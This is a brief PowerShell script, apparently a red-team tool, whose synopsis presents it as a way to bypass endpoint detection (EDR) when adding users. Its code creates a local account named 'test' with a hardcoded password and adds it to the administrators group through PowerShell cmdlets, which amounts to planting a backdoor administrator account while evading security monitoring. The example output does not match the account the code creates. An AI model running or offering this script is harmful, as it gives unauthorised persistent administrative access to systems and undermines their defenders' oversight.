function Net-User {
<#
.SYNOPSIS
    
    bypassEDR to net user require administrators.

    Author: lengyi (@鸿鹄实验室)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.DESCRIPTION

    Add a user named test and password test123!A

.EXAMPLE

    PS C:\> Net-User

    Name  Enabled Description
    ----  ------- -----------
    test1 True    lengyi test1 user.

.LINK

    None.

#>

[CmdletBinding()]

$Username = "test"
$P = "test123!A"
$Password = ConvertTo-SecureString $P -AsPlainText -Force
New-LocalUser $Username -Password $Password -FullName "lengyi test account" -Description "lengyi test user."
Add-LocalGroupMember -Group "administrators" -Member "test"
}
